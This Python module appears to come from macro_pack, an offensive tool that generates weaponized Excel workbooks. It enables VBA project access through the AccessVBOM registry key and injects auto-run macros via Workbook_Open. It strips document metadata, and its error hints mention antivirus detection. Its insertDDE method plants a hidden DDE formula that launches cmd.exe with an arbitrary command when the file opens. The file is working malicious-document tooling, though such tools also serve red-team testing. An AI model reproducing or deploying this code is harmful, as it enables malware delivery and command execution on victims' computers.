#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import sys
import os
from common.utils import MSTypes
from common import utils
if sys.platform == "win32":
    # Download and install pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/
    import win32com.client # @UnresolvedImport
    import winreg # @UnresolvedImport

import logging
from modules.vba_gen import VBAGenerator
from collections import OrderedDict


class ExcelGenerator(VBAGenerator):
    """ Module used to generate MS excel file from working dir content"""
    
    def getAutoOpenVbaFunction(self):
        return "Workbook_Open"
    
    def getAutoOpenVbaSignature(self):
        return "Sub Workbook_Open()"
    
        
    def enableVbom(self):
        # Enable writing in macro (VBOM)
        # First fetch the application version
        objExcel = win32com.client.Dispatch("Excel.Application")
        objExcel.Visible = False # do the operation in background 
        self.version = objExcel.Application.Version
        # IT is necessary to exit office or value wont be saved
        objExcel.Application.Quit()
        del objExcel
        # Next change/set AccessVBOM registry value to 1
        keyval = "Software\\Microsoft\Office\\"  + self.version + "\\Excel\\Security"
        logging.info("   [-] Set %s to 1..." % keyval)
        Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)
        winreg.SetValueEx(Registrykey,"AccessVBOM",0,winreg.REG_DWORD,1) # "REG_DWORD"
        winreg.CloseKey(Registrykey)
        
    
    def disableVbom(self):
        # Disable writing in VBA project
        #  Change/set AccessVBOM registry value to 0
        keyval = "Software\\Microsoft\Office\\"  + self.version + "\\Excel\\Security"
        logging.info("   [-] Set %s to 0..." % keyval)
        Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)
        winreg.SetValueEx(Registrykey,"AccessVBOM",0,winreg.REG_DWORD,0) # "REG_DWORD"
        winreg.CloseKey(Registrykey)
    
    
    def check(self):
        logging.info("   [-] Check feasibility...")
        if utils.checkIfProcessRunning("Excel.exe"):
            logging.error("   [!] Cannot generate Excel payload if Excel is already running.")
            if self.mpSession.forceYes or utils.yesOrNo(" Do you want macro_pack to kill Excel process? "):
                utils.forceProcessKill("Excel.exe")
            else:
                return False
        
        try:
            objExcel = win32com.client.Dispatch("Excel.Application")
            objExcel.Application.Quit()
            del objExcel
        except:
            logging.error("   [!] Cannot access Excel.Application object. Is software installed on machine? Abort.")
            return False  
        return True
    
    
    def insertDDE(self):
        logging.info(" [+] Include DDE attack...")
        # Get command line
        paramDict = OrderedDict([("Cmd_Line",None)])      
        self.fillInputParams(paramDict)
        command = paramDict["Cmd_Line"]

        logging.info("   [-] Open document...")
        # open up an instance of Excel with the win32com driver\        \\
        excel = win32com.client.Dispatch("Excel.Application")
        #disable auto-open macros
        secAutomation = excel.Application.AutomationSecurity
        msoAutomationSecurityForceDisable = 3 
        excel.Application.AutomationSecurity=msoAutomationSecurityForceDisable
        # do the operation in background without actually opening Excel
        excel.Visible = False
        workbook = excel.Workbooks.Open(self.outputFilePath)

        logging.info("   [-] Inject DDE field (Answer 'No' to popup)...")
        
        ddeCmd = r"""=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c %s'!'A1'""" % command.rstrip()
        excel.Cells(1, 26).Formula = ddeCmd
        excel.Cells(1, 26).FormulaHidden = True
        
        # Remove Informations
        logging.info("   [-] Remove hidden data and personal info...")
        xlRDIAll=99
        workbook.RemoveDocumentInformation(xlRDIAll)
        logging.info("   [-] Save Document...")
        excel.DisplayAlerts=False
        excel.Workbooks(1).Close(SaveChanges=1)
        excel.Application.Quit()
        #reenable auto-open macros
        excel.Application.AutomationSecurity = secAutomation
        # garbage collection
        del excel
         
    
    
    def generate(self):
        
        logging.info(" [+] Generating MS Excel document...")
        try:
            self.enableVbom()
            
            # open up an instance of Excel with the win32com driver\        \\
            excel = win32com.client.Dispatch("Excel.Application")
            # do the operation in background without actually opening Excel
            excel.Visible = False
            # open the excel workbook from the specified file or create if file does not exist
            logging.info("   [-] Open workbook...")
            workbook = excel.Workbooks.Add()
            
            self.resetVBAEntryPoint()
            logging.info("   [-] Inject VBA...")
            # Read generated files
            for vbaFile in self.getVBAFiles():
                logging.debug("     [,] Loading %s " % vbaFile)
                if vbaFile == self.getMainVBAFile():       
                    with open (vbaFile, "r") as f:
                        macro=f.read()
                        # Add the main macro- into ThisWorkbook part of excel file
                        excelModule = workbook.VBProject.VBComponents("ThisWorkbook")
                        excelModule.CodeModule.AddFromString(macro)
                else: # inject other vba files as modules
                    with open (vbaFile, "r") as f:
                        macro=f.read()
                        excelModule = workbook.VBProject.VBComponents.Add(1)
                        
                        
                        excelModule.Name = os.path.splitext(os.path.basename(vbaFile))[0]
                        excelModule.CodeModule.AddFromString(macro)
            
            excel.DisplayAlerts=False
            # Remove Informations
            logging.info("   [-] Remove hidden data and personal info...")
            xlRDIAll=99
            workbook.RemoveDocumentInformation(xlRDIAll)
            
            logging.info("   [-] Save workbook...")
            xlExcel8 = 56
            xlXMLFileFormatMap = {".xlsx": 51, ".xlsm": 52, ".xltm": 53}

            if self.outputFileType == MSTypes.XL97:
                workbook.SaveAs(self.outputFilePath, FileFormat=xlExcel8)
            elif MSTypes.XL == self.outputFileType:
                workbook.SaveAs(self.outputFilePath, FileFormat=xlXMLFileFormatMap[self.outputFilePath[-5:]])
            
            
            # save the workbook and close
            excel.Workbooks(1).Close(SaveChanges=1)
            excel.Application.Quit()
            # garbage collection
            del excel
            
            self.disableVbom()
            
            if self.mpSession.ddeMode: # DDE Attack mode
                self.insertDDE()
            
    
            logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
            logging.info("   [-] Test with : \n%s --run %s\n" % (utils.getRunningApp(),self.outputFilePath))
            
        except Exception:
            logging.exception(" [!] Exception caught!")
            logging.error(" [!] Hints: Check if MS office is really closed and Antivirus did not catch the files")
            logging.error(" [!] Attempt to force close MS Excel applications...")
            objExcel = win32com.client.Dispatch("Excel.Application")
            objExcel.Application.Quit()
            # If it Application.Quit() was not enough we force kill the process
            if utils.checkIfProcessRunning("Excel.exe"):
                utils.forceProcessKill("Excel.exe")
            del objExcel


        